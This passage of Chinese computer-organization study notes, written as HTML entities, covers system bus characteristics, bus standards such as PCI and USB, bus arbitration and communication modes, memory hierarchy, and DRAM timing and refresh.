&#x5355;&#x5411;&#xFF0C;&#x53D1;&#x51FA;&#x5404;&#x79CD;&#x63A7;&#x5236;&#x4FE1;&#x53F7;&#x3002;&#x6709;&#x51FA;(&#x5B58;&#x50A8;&#x5668;&#x8BFB;&#x3001;&#x5B58;&#x50A8;&#x5668;&#x5199;&#x603B;&#x7EBF;&#x5141;&#x8BB8;&#x3001;&#x4E2D;&#x65AD;&#x786E;&#x8BA4;),&#x6709;&#x5165;(&#x4E2D;&#x65AD;&#x8BF7;&#x6C42;&#x3001;&#x603B;&#x7EBF;&#x8BF7;&#x6C42;) &#x901A;&#x4FE1;&#x603B;&#x7EBF; &#x7528;&#x4E8E;&#x8BA1;&#x7B97;&#x673A;&#x7CFB;&#x7EDF;&#x4E4B;&#x95F4;&#x6216;&#x8BA1;&#x7B97;&#x673A;&#x7CFB;&#x7EDF;&#x4E0E;&#x5176;&#x4ED6;&#x7CFB;&#x7EDF;&#xFF08;&#x5982;&#x63A7;&#x5236;&#x4EEA;&#x8868;&#x3001;&#x79FB;&#x52A8;&#x901A;&#x4FE1;&#x7B49;&#xFF09;&#x4E4B;&#x95F4;&#x7684;&#x901A;&#x4FE1;&#x3002;&#x5206;&#x4E3A;&#x4E32;&#x884C;&#x901A;&#x4FE1;&#x548C;&#x5E76;&#x884C;&#x901A;&#x4FE1; &#x603B;&#x7EBF;&#x7269;&#x7406;&#x5B9E;&#x73B0; &#x603B;&#x7EBF;&#x7279;&#x6027; &#x603B;&#x7EBF;&#x7279;&#x6027; &#x673A;&#x68B0;&#x7279;&#x6027; &#x6307;&#x603B;&#x7EBF;&#x5728;&#x673A;&#x68B0;&#x8FDE;&#x63A5;&#x65B9;&#x5F0F;&#x4E0A;&#x7684;&#x4E00;&#x4E9B;&#x6027;&#x80FD;&#xFF0C;&#x5C3A;&#x5BF8;&#xFF0C;&#x5F62;&#x72B6;&#xFF0C;&#x5F15;&#x811A;&#x7684;&#x4E2A;&#x6570;&#x4EE5;&#x53CA;&#x6392;&#x5217;&#x7684;&#x987A;&#x5E8F;&#xFF0C;&#x63A5;&#x5934;&#x5904;&#x7684;&#x53EF;&#x9760;&#x63A5;&#x89E6; &#x7535;&#x6C14;&#x7279;&#x6027; &#x603B;&#x7EBF;&#x7684;&#x6BCF;&#x4E00;&#x6839;&#x4F20;&#x8F93;&#x7EBF;&#x4E0A;&#x4FE1;&#x53F7;&#x7684;&#x4F20;&#x8F93;&#x65B9;&#x5411;&#x548C;&#x6709;&#x6548;&#x7684;&#x7535;&#x5E73;&#x8303;&#x56F4; &#x529F;&#x80FD;&#x7279;&#x6027; &#x6BCF;&#x6839;&#x4F20;&#x8F93;&#x7EBF;&#x7684;&#x529F;&#x80FD;&#x3002;&#x5730;&#x5740;&#x603B;&#x7EBF;&#x7528;&#x6765;&#x6307;&#x51FA;&#x5730;&#x5740;&#x7801;&#xFF1B;&#x6570;&#x636E;&#x603B;&#x7EBF;&#x4F20;&#x9012;&#x6570;&#x636E;&#xFF1B;&#x63A7;&#x5236;&#x603B;&#x7EBF;&#x53D1;&#x51FA;&#x63A7;&#x5236;&#x4FE1;&#x53F7; &#x65F6;&#x95F4;&#x7279;&#x6027; &#x4FE1;&#x53F7;&#x7684;&#x65F6;&#x5E8F;&#x5173;&#x7CFB; &#x603B;&#x7EBF;&#x6027;&#x80FD;&#x6307;&#x6807; &#x6027;&#x80FD; &#x6307;&#x6807; &#x603B;&#x7EBF;&#x5BBD;&#x5EA6; &#x6570;&#x636E;&#x7EBF;&#x5206;&#x6839;&#x6570;&#xFF0C;&#x7528;bit &#x603B;&#x7EBF;&#x5E26;&#x5BBD; &#x6BCF;&#x79D2;&#x4F20;&#x8F93;&#x7684;&#x6700;&#x5927;&#x5B57;&#x8282;&#x6570;(MBps) &#x65F6;&#x949F;&#x540C;&#x6B65;/&#x5F02;&#x6B65; &#x540C;&#x6B65;&#xFF0C;&#x5F02;&#x6B65; &#x603B;&#x7EBF;&#x590D;&#x7528; &#x5730;&#x5740;&#x7EBF;&#x4E0E;&#x6570;&#x636E;&#x7EBF;&#x590D;&#x7528; &#x4FE1;&#x53F7;&#x7EBF;&#x6570; &#x5730;&#x5740;&#x7EBF;&#xFF0C;&#x6570;&#x636E;&#x7EBF;&#x548C;&#x63A7;&#x5236;&#x7EBF;&#x7684;&#x603B;&#x548C; &#x603B;&#x7EBF;&#x63A7;&#x5236;&#x65B9;&#x5F0F; &#x7A81;&#x53D1;&#xFF0C;&#x81EA;&#x52A8;&#xFF0C;&#x4EF2;&#x88C1;&#xFF0C;&#x903B;&#x8F91;&#xFF0C;&#x8BA1;&#x6570; &#x5176;&#x4ED6;&#x6307;&#x6807; &#x8D1F;&#x8F7D;&#x80FD;&#x529B;&#xFF08;&#x9A71;&#x52A8;&#x80FD;&#x529B;&#xFF09;&#xFF0C;&#x7535;&#x6E90;&#x7535;&#x538B;&#xFF0C;&#x603B;&#x7EBF;&#x5BBD;&#x5EA6;&#x80FD;&#x5426;&#x6269;&#x5C55;&#x7B49; &#x603B;&#x7EBF;&#x6807;&#x51C6; &#x603B;&#x7EBF;&#x6807;&#x51C6;&#xFF1A;&#x7CFB;&#x7EDF;&#x4E0E;&#x5404;&#x6A21;&#x5757;&#xFF0C;&#x6A21;&#x5757;&#x4E0E;&#x6A21;&#x5757;&#x4E4B;&#x95F4;&#x7684;&#x4E00;&#x4E2A;&#x4E92;&#x8FDE;&#x7684;&#x6807;&#x51C6;&#x754C;&#x9762; &#x4E3A;&#x4EC0;&#x4E48;&#x8981;&#x8BBE;&#x7ACB;&#x603B;&#x7EBF;&#x6807;&#x51C6;&#xFF1A;&#x4E3A;&#x4E86;&#x4F7F;&#x8BBE;&#x8BA1;&#x7B80;&#x5316;&#xFF0C;&#x6A21;&#x5757;&#x751F;&#x4EA7;&#x6279;&#x91CF;&#x5316;&#xFF0C;&#x786E;&#x4FDD;&#x5176;&#x6027;&#x80FD;&#x7A33;&#x5B9A;&#xFF0C;&#x8D28;&#x91CF;&#x53EF;&#x9760;&#xFF0C;&#x5B9E;&#x73B0;&#x53EF;&#x79FB;&#x5316;&#xFF0C;&#x4FBF;&#x4E8E;&#x7EF4;&#x62A4;&#x3002; &#x603B;&#x7EBF;&#x6807;&#x51C6; &#x6570;&#x636E;&#x7EBF; &#x5730;&#x5740;&#x7EBF; &#x603B;&#x7EBF;&#x65F6;&#x949F; &#x5E26;&#x5BBD; &#x7279;&#x6027; ISA 16 24 8MHz(&#x72EC;&#x7ACB;) 16MBps EISA 32 32 8MHz(&#x72EC;&#x7ACB;) 33MBps VESA(VL-BUS) 32 33MHz(CPU) 133MBps PCI 32 64 33MHz(&#x72EC;&#x7ACB;)66MHz(&#x72EC;&#x7ACB;) 132MBps528MBps &#x826F;&#x597D;&#x7684;&#x517C;&#x5BB9;&#x6027;&#xFF0C;&#x5373;&#x63D2;&#x5373;&#x7528;&#xFF0C;&#x652F;&#x6301;&#x591A;&#x4E3B;&#x8BBE;&#x5907;&#xFF0C;&#x5177;&#x6709;&#x4E0E;&#x5904;&#x7406;&#x5668;&#x548C;&#x5B58;&#x50A8;&#x5668;&#x5B50;&#x7CFB;&#x7EDF;&#x5B8C;&#x5168;&#x5E76;&#x884C;&#x64CD;&#x4F5C;&#x7684;&#x80FD;&#x529B;&#xFF0C;&#x63D0;&#x4F9B;&#x6570;&#x636E;&#x548C;&#x5730;&#x5740;&#x5947;&#x5076;&#x6821;&#x9A8C;&#xFF0C;&#x53EF;&#x6269;&#x5145;&#xFF0C;&#x8F6F;&#x4EF6;&#x517C;&#x5BB9;&#x6027;&#x597D;&#xFF0C;&#x652F;&#x6301;&#x4E24;&#x79CD;&#x7535;&#x538B;&#x6807;&#x51C6;5V&#x3001;3.3V&#xFF0C;&#x91C7;&#x7528;&#x591A;&#x8DEF;&#x590D;&#x7528; AGP 32 66.7MHz(&#x72EC;&#x7ACB;)133MHz(&#x72EC;&#x7ACB;) 266MBps533MBps RS-232C &#x4E32;&#x884C;&#x901A;&#x4FE1;&#x603B;&#x7EBF;&#x6807;&#x51C6; &#x6570;&#x636E;&#x7EC8;&#x7AEF;&#x8BBE;&#x5907;&#xFF08;&#x8BA1;&#x7B97;&#x673A;&#xFF09;&#x548C;&#x6570;&#x636E;&#x901A;&#x4FE1;&#x8BBE;&#x5907;&#xFF08;&#x8C03;&#x5236;&#x89E3;&#x8C03;&#x5668;&#xFF09;&#x4E4B;&#x95F4;&#x7684;&#x6807;&#x51C6;&#x63A5;&#x53E3; USB &#x4E32;&#x884C;&#x63A5;&#x53E3;&#x603B;&#x7EBF;&#x6807;&#x51C6; &#x666E;&#x901A;&#x65E0;&#x5C4F;&#x853D;&#x53CC;&#x7EDE;&#x7EBF;&#x5E26;&#x5C4F;&#x853D;&#x53CC;&#x7EDE;&#x7EBF;&#x6700;&#x9AD8; 1.5 Mbps(USB1.0)12Mbps(USB1.0)480Mbps(USB2.0) &#x5177;&#x6709;&#x771F;&#x6B63;&#x7684;&#x5373;&#x63D2;&#x5373;&#x7528;&#xFF0C;&#x5F88;&#x5F3A;&#x7684;&#x8FDE;&#x63A5;&#x80FD;&#x529B;&#xFF0C;&#x6570;&#x636E;&#x4F20;&#x8F93;&#x7387;&#xFF0C;&#x6807;&#x51C6;&#x7EDF;&#x4E00; &#x603B;&#x7EBF;&#x7ED3;&#x6784; &#x5355;&#x603B;&#x7EBF;&#x7ED3;&#x6784; &#x53CC;&#x603B;&#x7EBF;&#x7ED3;&#x6784; &#x4E09;&#x603B;&#x7EBF;&#x7ED3;&#x6784; &#x4E09;&#x603B;&#x7EBF;&#x7ED3;&#x6784;&#x53C8;&#x4E00; &#x56DB;&#x603B;&#x7EBF;&#x7ED3;&#x6784; &#x603B;&#x7EBF;&#x5224;&#x4F18;&#x63A7;&#x5236; &#x4E3A;&#x4EC0;&#x4E48;&#x8981;&#x8BBE;&#x7F6E;&#x603B;&#x7EBF;&#x5224;&#x4F18;&#x63A7;&#x5236;&#xFF1A;&#x603B;&#x7EBF;&#x4E0A;&#x6240;&#x8FDE;&#x63A5;&#x7684;&#x5404;&#x7C7B;&#x8BBE;&#x5907;&#xFF0C;&#x6309;&#x5176;&#x5BF9;&#x603B;&#x7EBF;&#x6709;&#x65E0;&#x63A7;&#x5236;&#x529F;&#x80FD;&#x5206;&#x4E3A;&#x4E3B;&#x8BBE;&#x5907;(&#x6A21;&#x5757;)&#x548C;&#x4ECE;&#x8BBE;&#x5907;(&#x6A21;&#x5757;)&#x3002;&#x4E3B;&#x8BBE;&#x5907;&#x5BF9;&#x603B;&#x7EBF;&#x6709;&#x63A7;&#x5236;&#x6743;&#xFF0C;&#x4ECE;&#x8BBE;&#x5907;&#x53EA;&#x80FD;&#x54CD;&#x5E94;&#x4ECE;&#x4E3B;&#x8BBE;&#x5907;&#x53D1;&#x6765;&#x7684;&#x603B;&#x7EBF;&#x547D;&#x4EE4;&#xFF0C;&#x5BF9;&#x603B;&#x7EBF;&#x6CA1;&#x6709;&#x63A7;&#x5236;&#x6743;&#x3002;&#x603B;&#x7EBF;&#x4E0A;&#x7684;&#x4FE1;&#x606F;&#x662F;&#x53C8;&#x4E3B;&#x8BBE;&#x5907;&#x542F;&#x52A8;&#x7684;&#xFF0C;&#x82E5;&#x591A;&#x4E2A;&#x4E3B;&#x8BBE;&#x5907;&#x540C;&#x65F6;&#x8981;&#x4F7F;&#x7528;&#x603B;&#x7EBF;&#x65F6;&#xFF0C;&#x5C31;&#x7531;&#x603B;&#x7EBF;&#x63A7;&#x5236;&#x5668;&#x7684;&#x4F18;&#x5224;&#xFF0C;&#x4EF2;&#x88C1;&#x903B;&#x8F91;&#x6309;&#x4E00;&#x5B9A;&#x7684;&#x4F18;&#x5148;&#x7B49;&#x7EA7;&#x987A;&#x5E8F;&#x786E;&#x5B9A;&#x54EA;&#x4E2A;&#x4E3B;&#x8BBE;&#x5907;&#x80FD;&#x4F7F;&#x7528;&#x603B;&#x7EBF;&#x3002; &#x603B;&#x7EBF;&#x4F18;&#x5224;&#x63A7;&#x5236;&#x5206;&#x4E3A;&#x96C6;&#x4E2D;&#x5F0F;&#x548C;&#x5206;&#x5E03;&#x5F0F;&#x4E24;&#x79CD; &#x96C6;&#x4E2D;&#x5F0F;&#x79CD;&#x7C7B; &#x7279;&#x70B9; &#x94FE;&#x5F0F;&#x67E5;&#x8BE2; &#x8FDE;&#x7EBF;&#x7B80;&#x5355;&#xFF0C;&#x6613;&#x4E8E;&#x6269;&#x5145;&#xFF0C;&#x5BF9;&#x7535;&#x8DEF;&#x6545;&#x969C;&#x6700;&#x654F;&#x611F; &#x8BA1;&#x6570;&#x5668;&#x5B9A;&#x65F6;&#x67E5;&#x8BE2; &#x4F18;&#x5148;&#x7EA7;&#x8BBE;&#x7F6E;&#x8F83;&#x7075;&#x6D3B;&#xFF0C;&#x5BF9;&#x6545;&#x969C;&#x4E0D;&#x654F;&#x611F;&#xFF0C;&#x8FDE;&#x7EBF;&#x53CA;&#x63A7;&#x5236;&#x8FC7;&#x7A0B;&#x8F83;&#x590D;&#x6742; &#x72EC;&#x7ACB;&#x8BF7;&#x6C42; &#x54CD;&#x5E94;&#x901F;&#x5EA6;&#x5FEB;&#xFF0C;&#x4F18;&#x5148;&#x7EA7;&#x6B21;&#x5E8F;&#x63A7;&#x5236;&#x7075;&#x6D3B;&#xFF0C;&#x4F46;&#x8FDE;&#x7EBF;&#x591A;&#xFF0C;&#x603B;&#x7EBF;&#x63A7;&#x5236;&#x590D;&#x6742; &#x603B;&#x7EBF;&#x901A;&#x4FE1; &#x901A;&#x4FE1;&#x65B9;&#x5F0F; &#x7279;&#x70B9; &#x9002;&#x7528;&#x573A;&#x5408; &#x540C;&#x6B65;&#x901A;&#x4FE1; &#x6307;&#x7531;&#x7EDF;&#x4E00;&#x65F6;&#x949F;&#x63A7;&#x5236;&#x7684;&#x901A;&#x4FE1;&#xFF0C;&#x63A7;&#x5236;&#x65B9;&#x5F0F;&#x7B80;&#x5355;&#xFF0C;&#x7075;&#x6D3B;&#x6027;&#x5DEE;&#xFF0C;&#x5F53;&#x7CFB;&#x7EDF;&#x4E2D;&#x5404;&#x90E8;&#x4EF6;&#x5DE5;&#x4F5C;&#x901F;&#x5EA6;&#x5DEE;&#x5F02;&#x8F83;&#x5927;&#x65F6;&#xFF0C;&#x603B;&#x7EBF;&#x5DE5;&#x4F5C;&#x6548;&#x7387;&#x660E;&#x663E;&#x4E0B;&#x964D; &#x4E00;&#x822C;&#x7528;&#x4E8E;&#x603B;&#x7EBF;&#x957F;&#x5EA6;&#x8F83;&#x77ED;&#xFF0C;&#x5404;&#x90E8;&#x4EF6;&#x5B58;&#x53D6;&#x65F6;&#x95F4;&#x6BD4;&#x8F83;&#x4E00;&#x81F4;&#x7684;&#x573A;&#x5408; &#x5F02;&#x6B65;&#x901A;&#x4FE1; &#x6307;&#x6CA1;&#x6709;&#x7EDF;&#x4E00;&#x65F6;&#x949F;&#x63A7;&#x5236;&#x7684;&#x901A;&#x4FE1;&#xFF0C;&#x90E8;&#x4EF6;&#x91C7;&#x7528;&#x5E94;&#x7B54;&#x65B9;&#x5F0F;&#x8FDB;&#x884C;&#x8054;&#x7CFB;&#xFF0C;&#x63A7;&#x5236;&#x65B9;&#x5F0F;&#x8F83;&#x540C;&#x6B65;&#x590D;&#x6742;&#xFF0C;&#x7075;&#x6D3B;&#x6027;&#x9AD8;&#xFF0C;&#x5F53;&#x7CFB;&#x7EDF;&#x4E2D;&#x5404;&#x90E8;&#x4EF6;&#x5DE5;&#x4F5C;&#x901F;&#x5EA6;&#x5DEE;&#x5F02;&#x8F83;&#x5927;&#x65F6;&#xFF0C;&#x6709;&#x5229;&#x4E8E;&#x63D0;&#x9AD8;&#x603B;&#x7EBF;&#x5DE5;&#x4F5C;&#x6548;&#x7387; &#x53C8;&#x5206;&#x4E3A;&#x4E0D;&#x4E92;&#x9501;&#xFF0C;&#x534A;&#x4E92;&#x9501;&#xFF0C;&#x5168;&#x4E92;&#x9501; &#x534A;&#x540C;&#x6B65;&#x901A;&#x4FE1; &#x65E2;&#x53EF;&#x4EE5;&#x50CF;&#x540C;&#x6B65;&#x901A;&#x4FE1;&#x4E00;&#x6837;&#x7531;&#x7EDF;&#x4E00;&#x65F6;&#x949F;&#x63A7;&#x5236;&#xFF0C;&#x53C8;&#x53EF;&#x4EE5;&#x50CF;&#x5F02;&#x6B65;&#x901A;&#x4FE1;&#x4E00;&#x6837;&#x5141;&#x8BB8;&#x4F20;&#x8F93;&#x65F6;&#x95F4;&#x4E0D;&#x4E00;&#x81F4;&#xFF0C;&#x5DE5;&#x4F5C;&#x6548;&#x7387;&#x4ECB;&#x4E8E;&#x4E24;&#x8005;&#x4E4B;&#x95F4; &#x5206;&#x79BB;&#x5F0F;&#x901A;&#x4FE1; 1.&#x5404;&#x6A21;&#x5757;&#x6B32;&#x5360;&#x7528;&#x603B;&#x7EBF;&#x4F7F;&#x7528;&#x6743;&#x5FC5;&#x987B;&#x63D0;&#x51FA;&#x7533;&#x8BF7;2.&#x5728;&#x5F97;&#x5230;&#x603B;&#x7EBF;&#x4F7F;&#x7528;&#x6743;&#x540E;&#xFF0C;&#x4E3B;&#x6A21;&#x5757;&#x5728;&#x9650;&#x5B9A;&#x7684;&#x65F6;&#x95F4;&#x5185;&#x5411;&#x5BF9;&#x65B9;&#x4F20;&#x9001;&#x4FE1;&#x606F;&#xFF0C;&#x91C7;&#x7528;&#x540C;&#x6B65;&#x65B9;&#x5F0F;&#xFF0C;&#x4E0D;&#x518D;&#x7B49;&#x5F85;&#x5BF9;&#x65B9;&#x56DE;&#x7B54;&#x4FE1;&#x53F7;3.&#x5404;&#x6A21;&#x5757;&#x5728;&#x51C6;&#x5907;&#x6570;&#x636E;&#x7684;&#x8FC7;&#x7A0B;&#x4E2D;&#x90FD;&#x4E0D;&#x5360;&#x7528;&#x603B;&#x7EBF;&#xFF0C;&#x4F7F;&#x603B;&#x7EBF;&#x53EF;&#x4EE5;&#x63A5;&#x53D7;&#x5176;&#x4ED6;&#x6A21;&#x5757;&#x7684;&#x8BF7;&#x6C42;4.&#x603B;&#x7EBF;&#x88AB;&#x5360;&#x7528;&#x65F6;&#x90FD;&#x5728;&#x505A;&#x6709;&#x6548;&#x5DE5;&#x4F5C;&#xFF0C;&#x6216;&#x8005;&#x901A;&#x8FC7;&#x5B83;&#x53D1;&#x9001;&#x547D;&#x4EE4;&#xFF0C;&#x6216;&#x8005;&#x901A;&#x8FC7;&#x5B83;&#x4F20;&#x9001;&#x6570;&#x636E;&#xFF0C;&#x4E0D;&#x5B58;&#x5728;&#x7A7A;&#x95F2;&#x7B49;&#x5F85;&#x65F6;&#x95F4;&#xFF0C;&#x5145;&#x5206;&#x7684;&#x5229;&#x7528;&#x4E86;&#x603B;&#x7EBF;&#x7684;&#x6709;&#x6548;&#x5360;&#x7528;&#xFF0C;&#x4ECE;&#x800C;&#x5B9E;&#x73B0;&#x4E86;&#x603B;&#x7EBF;&#x5728;&#x591A;&#x4E2A;&#x4E3B;&#xFF0C;&#x4ECE;&#x6A21;&#x5757;&#x95F4;&#x8FDB;&#x884C;&#x4EA4;&#x53C9;&#x91CD;&#x53E0;&#x5E76;&#x884C;&#x4F20;&#x9001;&#x3002; &#x5927;&#x578B;&#x8BA1;&#x7B97;&#x673A;&#x7CFB;&#x7EDF; &#x540C;&#x6B65;&#x5F0F;&#x6570;&#x636E;&#x8F93;&#x5165;&#x4F20;&#x8F93; &#x540C;&#x6B65;&#x5F0F;&#x6570;&#x636E;&#x8F93;&#x51FA;&#x4F20;&#x8F93; &#x56DB; &#x5B58;&#x50A8;&#x5668; &#x5B58;&#x50A8;&#x5668;&#x5206;&#x7C7B; &#x5B58;&#x50A8;&#x5668;&#x901F;&#x5EA6;&#x5BB9;&#x91CF;&#x548C;&#x4EF7;&#x4F4D;&#x7684;&#x5173;&#x7CFB; &#x7F13;&#x5B58;&#x4E3B;&#x5B58;&#x5C42;&#x6B21;&#x548C;&#x4E3B;&#x5B58;&#x8F85;&#x5B58;&#x5C42;&#x6B21; &#x7F13;&#x5B58;&#x4E3B;&#x5B58;&#x2013;&#x89E3;&#x51B3;CPU&#x548C;&#x4E3B;&#x5B58;&#x901F;&#x5EA6;&#x4E0D;&#x5339;&#x914D;&#x7684;&#x95EE;&#x9898; &#x4E3B;&#x5B58;&#x8F85;&#x5B58;&#x2013;&#x89E3;&#x51B3;&#x5B58;&#x50A8;&#x7CFB;&#x7EDF;&#x7684;&#x5BB9;&#x91CF;&#x95EE;&#x9898; &#x4E3B;&#x5B58;&#x7684;&#x4E3B;&#x8981;&#x6280;&#x672F;&#x6307;&#x6807; &#x5B58;&#x50A8;&#x5BB9;&#x91CF; &#x6307;&#x4E3B;&#x5B58;&#x80FD;&#x5B58;&#x653E;&#x4E8C;&#x8FDB;&#x5236;&#x4EE3;&#x7801;&#x7684;&#x603B;&#x4F4D;&#x6570; &#x5B58;&#x50A8;&#x5BB9;&#x91CF;=&#x5B58;&#x50A8;&#x5355;&#x5143;&#x4E2A;&#x6570;*&#x5B58;&#x50A8;&#x5B57;&#x957F; &#x5B58;&#x50A8;&#x5BB9;&#x91CF;=&#x5B58;&#x50A8;&#x5355;&#x5143;&#x4E2A;&#x6570;*&#x5B58;&#x50A8;&#x5B57;&#x957F;/8 &#x5B58;&#x50A8;&#x901F;&#x5EA6; &#x7531;&#x5B58;&#x53D6;&#x65F6;&#x95F4;&#x548C;&#x5B58;&#x53D6;&#x5468;&#x671F;&#x6765;&#x8868;&#x793A;&#xFF0C;&#x5B58;&#x53D6;&#x65F6;&#x95F4;&#x6307;&#x5B58;&#x50A8;&#x5668;&#x7684;&#x8BBF;&#x65F6;&#x95F4;&#xFF0C;&#x5B58;&#x53D6;&#x5468;&#x671F;&#x6307;&#x5B58;&#x50A8;&#x5668;&#x8FDB;&#x884C;&#x4E24;&#x6B21;&#x72EC;&#x7ACB;&#x7684;&#x5B58;&#x50A8;&#x5668;&#x64CD;&#x4F5C;&#x6240;&#x9700;&#x7684;&#x6700;&#x5C0F;&#x65F6;&#x95F4;&#x95F4;&#x9694; &#x5B58;&#x50A8;&#x5668;&#x5E26;&#x5BBD; &#x5355;&#x4F4D;&#x65F6;&#x95F4;&#x5185;&#x5B58;&#x50A8;&#x5668;&#x5B58;&#x53D6;&#x7684;&#x4FE1;&#x606F;&#x91CF;&#xFF0C;&#x5355;&#x4F4D;&#x53EF;&#x4EE5;&#x7528;&#x5B57;/&#x79D2;&#x6216;&#x5B57;&#x8282;/&#x79D2;&#x6216;&#x4F4D;/&#x79D2;&#x3002;&#x63D0;&#x9AD8;&#x5B58;&#x50A8;&#x5668;&#x5E26;&#x5BBD;&#x53EF;&#x4EE5;1.&#x7F29;&#x77ED;&#x5B58;&#x53D6;&#x5468;&#x671F;2.&#x589E;&#x52A0;&#x5B58;&#x50A8;&#x5B57;&#x957F;&#xFF0C;&#x4F7F;&#x6BCF;&#x4E2A;&#x5B58;&#x53D6;&#x5468;&#x671F;&#x53EF;&#x8BFB;/&#x5199;&#x66F4;&#x591A;&#x7684;&#x4E8C;&#x8FDB;&#x5236;&#x4F4D;&#x6570; 3.&#x589E;&#x52A0;&#x5B58;&#x50A8;&#x4F53; &#x9759;&#x6001;RAM &#x52A8;&#x6001;RAM &#x52A8;&#x6001;RAM&#x901A;&#x8FC7;&#x7535;&#x5BB9;&#x6765;&#x5B58;&#x50A8;&#x7535;&#x8377;&#x7684;&#x539F;&#x7406;&#x6765;&#x5B58;&#x50A8;&#x4FE1;&#x606F;&#xFF0C;&#x7535;&#x5BB9;&#x4E0A;&#x6709;&#x8DB3;&#x591F;&#x591A;&#x7684;&#x7535;&#x8377;&#x8868;&#x793A;&#x5B58;1&#xFF0C;&#x65E0;&#x7535;&#x8377;&#x8868;&#x793A;&#x5B58;0&#xFF0C;&#x7535;&#x5BB9;&#x4E0A;&#x7535;&#x8377;&#x4E00;&#x822C;&#x53EA;&#x80FD;&#x7EF4;&#x6301;1&#x2014;&#x2014;2ms&#xFF0C;&#x56E0;&#x6B64;&#xFF0C;&#x5FC5;&#x987B;&#x5728;2ms&#x5185;&#x5BF9;&#x5176;&#x6240;&#x5B58;&#x50A8;&#x5355;&#x5143;&#x6062;&#x590D;&#x4E00;&#x6B21;&#x539F;&#x72B6;&#x6001;&#xFF0C;&#x8FD9;&#x4E2A;&#x8FC7;&#x7A0B;&#x79F0;&#x4E3A;&#x518D;&#x751F;&#x6216;&#x5237;&#x65B0;&#x3002; &#x52A8;&#x6001;RAM&#x65F6;&#x5E8F;&#x56FE; &#x5148;&#x7531;RAS&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;RAS&#xAF;&#x5C06;&#x884C;&#x5730;&#x5740;&#x9001;&#x5165;&#x884C;&#x5730;&#x5740;&#x7F13;&#x5B58;&#x5668;&#xFF0C;&#x518D;&#x7531;CAS&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;CAS&#xAF;&#x5C06;&#x5217;&#x5730;&#x5740;&#x9001;&#x5165;&#x5217;&#x5730;&#x5740;&#x7F13;&#x5B58;&#x5668;&#xFF0C;&#x56E0;&#x6B64;CAS&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;CAS&#xAF;&#x6EDE;&#x540E;&#x4E8E;RAS&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;RAS&#xAF;&#x7684;&#x65F6;&#x95F4;&#x5FC5;&#x987B;&#x8981;&#x8D85;&#x8FC7;&#x5176;&#x89C4;&#x5B9A;&#x503C; RAS&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;RAS&#xAF;&#x548C;CAS&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;CAS&#xAF;&#x6B63;&#x3001;&#x8D1F;&#x7535;&#x5E73;&#x7684;&#x5BBD;&#x5EA6;&#x8981;&#x5927;&#x4E8E;&#x89C4;&#x5B9A;&#x503C;&#xFF0C;&#x4EE5;&#x4FDD;&#x8BC1;&#x82AF;&#x7247;&#x5185;&#x90E8;&#x6B63;&#x5E38;&#x5DE5;&#x4F5C; &#x884C;&#x5730;&#x5740;&#x5BF9;RAS&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;RAS&#xAF;&#x7684;&#x4E0B;&#x964D;&#x6CBF;&#x4EE5;&#x53CA;&#x5217;&#x5730;&#x5740;&#x5BF9;CAS&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;CAS&#xAF;&#x7684;&#x4E0B;&#x964D;&#x6CBF;&#x5E94;&#x6709;&#x8DB3;&#x591F;&#x7684;&#x5730;&#x5740;&#x5EFA;&#x7ACB;&#x65F6;&#x95F4;&#x548C;&#x5730;&#x5740;&#x4FDD;&#x6301;&#x65F6;&#x95F4;&#xFF0C;&#x5DF2;&#x786E;&#x5B9A;&#x884C;&#x3001;&#x5217;&#x5730;&#x5740;&#x5747;&#x80FD;&#x51C6;&#x786E;&#x5199;&#x5165;&#x82AF;&#x7247;&#x3002; &#x52A8;&#x6001;RAM&#x8BFB;&#x65F6;&#x5E8F;&#x884C;&#x5730;RAS&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;RAS&#xAF;&#x6709;&#x6548;&#x5199;&#x5141;&#x8BB8;WE&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;WE&#xAF;&#x6709;&#x6548;&#xFF08;&#x9AD8;&#xFF09;&#x5217;&#x5730;&#x5740;CAS&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;CAS&#xAF;&#x6709;&#x6548;&#x6570;&#x636E;DOUTDOUT&#x6709;&#x6548; &#x52A8;&#x6001;RAM&#x5199;&#x65F6;&#x5E8F;&#x884C;&#x5730;&#x5740;RAS&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;RAS&#xAF;&#x6709;&#x6548;&#x5199;&#x5141;&#x8BB8;WE&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;WE&#xAF;&#x6709;&#x6548;&#xFF08;&#x4F4E;&#xFF09;&#x6570;&#x636E;DINDIN&#x6709;&#x5217;&#x5730;&#x5740;CAS&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;CAS&#xAF;&#x6709;&#x6548; &#x52A8;&#x6001;RAM&#x5237;&#x65B0;&#x5237;&#x65B0;&#x5B9E;&#x8D28;&#x662F;&#x5C06;&#x539F;&#x4FE1;&#x606F;&#x8BFB;&#x51FA;&#xFF0C;&#x5728;&#x7531;&#x5237;&#x65B0;&#x653E;&#x5927;&#x5668;&#x5F62;&#x6210;&#x539F;&#x4FE1;&#x606F;&#x5E76;&#x91CD;&#x65B0;&#x5199;&#x5165;&#x7684;&#x518D;&#x751F;&#x8FC7;&#x7A0B; 